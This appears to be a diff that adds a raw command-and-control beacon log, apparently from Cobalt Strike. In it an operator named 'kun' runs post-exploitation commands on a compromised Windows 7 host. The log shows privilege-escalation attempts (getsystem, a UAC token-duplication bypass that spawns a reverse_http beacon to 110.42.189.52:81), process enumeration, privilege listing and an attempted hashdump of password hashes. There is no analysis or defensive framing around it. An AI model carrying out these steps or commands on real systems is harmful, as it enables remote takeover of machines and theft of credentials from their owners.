@@ -1,0 +1,110 @@
+01/09 14:20:16 UTC [metadata] 36.112.187.40 <- 192.168.178.23; computer: DC-WIN7; user: Tb; process: rundll32.exe; pid: 2228; os: Windows; version: 6.1; build: 7601; beacon arch: x64 (x64)
+01/09 14:20:16 UTC [task] <T1029> Tasked beacon to sleep for 30s (30% jitter)
+01/09 14:20:16 UTC [note] Bid: 1341166846  NT: 6.1
+01/09 14:21:15 UTC [checkin] host called home, sent: 16 bytes
+01/09 14:22:53 UTC [input] <kun> sleep 0
+01/09 14:22:53 UTC [task] <T1029> Tasked beacon to become interactive
+01/09 14:22:58 UTC [input] <kun> getuid
+01/09 14:22:59 UTC [task] <> Tasked beacon to get userid
+01/09 14:23:14 UTC [input] <kun> getsystem
+01/09 14:23:14 UTC [task] <T1134> Tasked beacon to get SYSTEM
+01/09 14:23:16 UTC [checkin] host called home, sent: 3263 bytes
+01/09 14:23:16 UTC [output]
+You are DC-WIN7\Tb
+
+01/09 14:23:16 UTC [output]
+received output:
+getsystem failed.
+
+01/09 14:23:32 UTC [input] <kun> ps
+01/09 14:23:32 UTC [task] <T1057> Tasked beacon to list processes
+01/09 14:23:32 UTC [checkin] host called home, sent: 12 bytes
+01/09 14:23:33 UTC [output]
+[System Process]	0	0
+System	0	4
+smss.exe	4	268
+csrss.exe	348	368
+wininit.exe	348	412
+csrss.exe	420	432
+services.exe	412	476
+winlogon.exe	420	508
+lsass.exe	412	540
+lsm.exe	412	548
+svchost.exe	476	648
+svchost.exe	476	728
+svchost.exe	476	776
+svchost.exe	476	900
+svchost.exe	476	928
+svchost.exe	476	348
+svchost.exe	476	1052
+spoolsv.exe	476	1224
+svchost.exe	476	1252
+svchost.exe	476	1388
+LdxFileServer.exe	476	1432
+VGAuthService.exe	476	1576
+vm3dservice.exe	476	1632
+vmtoolsd.exe	476	1656
+vm3dservice.exe	1632	1664
+svchost.exe	476	1096
+svchost.exe	476	896
+WmiPrvSE.exe	648	2100
+dllhost.exe	476	2204
+msdtc.exe	476	2344
+taskhost.exe	476	2472	x64	DC-WIN7\Tb	1
+LdReject32.exe	1432	2588
+LdReject64.exe	1432	2596
+conhost.exe	432	2612
+conhost.exe	432	2624
+dwm.exe	900	2848	x64	DC-WIN7\Tb	1
+explorer.exe	2836	2888	x64	DC-WIN7\Tb	1
+GoogleCrashHandler.exe	2860	2928
+GoogleCrashHandler64.exe	2860	2936
+vmtoolsd.exe	2888	3052	x64	DC-WIN7\Tb	1
+SearchIndexer.exe	476	880
+svchost.exe	476	2280
+artifact_x64.exe	2888	3460	x64	DC-WIN7\Tb	1
+hw.exe	632	3660	x64	DC-WIN7\Tb	1
+rundll32.exe	2692	3912	x64	DC-WIN7\Tb	1
+rundll32.exe	3660	2228	x64	DC-WIN7\Tb	1
+sppsvc.exe	476	3044
+
+
+01/09 14:24:00 UTC [input] <kun> elevate uac-token-duplication http
+01/09 14:24:01 UTC [task] <T1088, T1093> Tasked beacon to spawn windows/beacon_http/reverse_http (110.42.189.52:81) in a high integrity process (token duplication)
+01/09 14:24:01 UTC [checkin] host called home, sent: 305523 bytes
+01/09 14:24:05 UTC [output]
+received output:
+[+] Success! Started taskmgr.exe and used its token.
+
+01/09 14:24:10 UTC [input] <kun> getuid
+01/09 14:24:10 UTC [task] <> Tasked beacon to get userid
+01/09 14:24:12 UTC [checkin] host called home, sent: 8 bytes
+01/09 14:24:21 UTC [output]
+You are DC-WIN7\Tb
+
+01/09 14:24:21 UTC [input] <kun> 
+01/09 14:24:21 UTC [error] Unknown command: 
+01/09 14:24:21 UTC [input] <kun> 
+01/09 14:24:21 UTC [error] Unknown command: 
+01/09 14:24:32 UTC [input] <kun> getprivs
+01/09 14:24:32 UTC [task] <T1134> Tasked beacon to enable privileges
+01/09 14:24:37 UTC [checkin] host called home, sent: 755 bytes
+01/09 14:24:37 UTC [output]
+received output:
+SeShutdownPrivilege
+SeChangeNotifyPrivilege
+SeUndockPrivilege
+
+
+01/09 14:25:49 UTC [input] <kun> hashdump
+01/09 14:25:49 UTC [error] hashdump error: this command requires administrator privileges
+01/09 14:26:02 UTC [input] <kun> getsystem
+01/09 14:26:02 UTC [task] <T1134> Tasked beacon to get SYSTEM
+01/09 14:26:02 UTC [checkin] host called home, sent: 3239 bytes
+01/09 14:26:06 UTC [output]
+received output:
+getsystem failed.
+
+01/09 14:26:37 UTC [input] <kun> process_browser
+01/09 14:26:37 UTC [task] <> Tasked beacon to list processes (from Process Browser)
+01/09 14:26:38 UTC [checkin] host called home, sent: 12 bytes
